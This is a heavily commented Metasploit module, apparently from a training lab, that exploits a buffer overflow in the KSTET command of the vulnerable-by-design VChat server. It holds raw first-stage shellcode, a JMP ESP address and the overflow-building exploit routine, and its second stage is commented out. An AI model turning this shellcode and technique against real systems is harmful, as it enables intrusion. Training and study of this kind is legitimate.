##
# The # symbol starts a comment
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# File path: /usr/share/metasploit-framework/modules/exploit/windows/VChat/KSTET_MULTI,rb
##
# This module exploits the KSTET command of vulnerable chat server using a multistaged attack.
##

class MetasploitModule < Msf::Exploit::Remote   # This is a remote exploit module inheriting from the remote exploit class
  Rank = NormalRanking  # Potential impact to the target

  include Msf::Exploit::Remote::Tcp     # Include remote tcp exploit module

  def initialize(info = {})     # i.e. constructor, setting the initial values
    super(update_info(info,
      'Name'           => 'VChat/Vulnserver Buffer Overflow-KSTET command MultiStage',  # Name of the target
      'Description'    => %q{   # Explaining what the module does
         This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell. 
      },
      'Author'         => [ 'fxw' ],    ## Hacker name
      'License'        => MSF_LICENSE,
      'References'     =>       # References for the vulnerability or exploit
        [
          #[ 'URL', 'https://github.com/DaintyJet/Making-Dos-DDoS-Metasploit-Module-Vulnserver/'],
          [ 'URL', 'https://github.com/DaintyJet/VChat_KSTET_MULTI' ]

        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
        },
      'Payload'        =>       # How to encode and generate the payload
        {
          'BadChars' => "\x00\x0a\x0d"  # Bad characters to avoid in generated shellcode
        },
      'Platform'       => 'Win',        # Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
      'Targets'        =>       #  targets for many exploits
      [
        [ 'EssFuncDLL-JMPESP',
          {
            'jmpesp' => 0x62501023 # This will be available in [target['jmpesp']]
          }
        ]
      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar. 30, 2022'))     # When the vulnerability was disclosed in public

      register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
          [
          OptInt.new('RETOFFSET_KSTET', [true, 'Offset of Return Address in function KSTET', 58]),
          OptString.new('FIRST_STAGE', [true, 'First Stage Shellcode, Hex string', "\x83\xec\x64\x31\xff\x31\xdb\x53\x80\xc7\x04\x53\x89\xe3\x83\xc3\x64\x53\x47\x57\xb8\xa0\x23\xf1\x74\xff\xd0\x85\xc0\x75\xe6"]),
          OptString.new('SHORT_JUMP', [true, 'Short Jump, Hex string', "\xeb\xc5"]),
          Opt::RPORT(9999),
          Opt::RHOSTS('192.168.7.191')
      ])

  end
  def exploit   # Actual exploit
    print_status("Connecting to target...")
    connect     # Connect to the target

    first_stage = datastore['FIRST_STAGE'].gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }
    short_jump = datastore['SHORT_JUMP'].gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }
    shellcode = payload.encode()

    outbound_stage_1 = 'KSTET ' + "\x90"*8 + first_stage + "\x90"*(datastore['RETOFFSET_KSTET'] - 8 - first_stage.length()) + [target['jmpesp']].pack('V') + short_jump  # Create the malicious string that will be sent to the target

    print_status("Sending First Stage")
    sock.puts(outbound_stage_1) # Send the attacking payload

   # print_status("Sending Second Stage")
   # sock.puts(shellcode)       # Send the attacking payload

    disconnect
  end
end
